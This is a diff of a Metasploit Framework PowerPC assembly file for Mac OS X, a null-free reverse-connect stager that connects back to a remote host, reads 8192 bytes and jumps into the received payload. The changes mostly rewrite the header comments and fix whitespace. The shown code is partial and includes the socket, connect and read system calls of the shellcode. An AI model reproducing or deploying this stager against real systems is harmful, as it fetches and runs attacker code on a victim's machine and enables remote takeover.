@@ -1,6 +1,22 @@
-;      Title:  MacOS X Reverse Connect Read + Jump
-;  Platforms:  MacOS X (Tested 10.3.3 | 10.3.4)
-;     Author:  hdm[at]metasploit.com
+;;
+;
+;        Name: osx_reverse_read_nf
+;   Qualities: Null-Free
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore <hdm [at] metasploit.com>
+;     Version: $Revision$
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Connects back, reads 8192 bytes, jumps into payload.
+;        Socket descriptor is left in r30.
+;
+;;
 
 
 .globl _main
@@ -16,7 +32,7 @@ _socket:
 
 	.long   0x44ffff02
 	xor     r5, r5, r5
-        mr      r30, r3
+	mr      r30, r3
 
 _storeaddr:
 
@@ -40,9 +56,9 @@ konnect:
 	la	r4, -20(r1)
 	subi	r5, r27, 0x3030 + 97 - 16
 	subi	r0, r27, 0x3030 + 97 - 98
-        mr      r3, r30
+	mr      r3, r30
 	.long   0x44ffff02
-        xor     r5, r5, r5
+	xor     r5, r5, r5
 		
 reader:
 	li	r29, 0x3330
@@ -57,3 +73,4 @@ reader:
 	xor	r5, r5, r5
 	xor.	r5, r5, r5
 	blectr
+	xor	r5, r5, r5
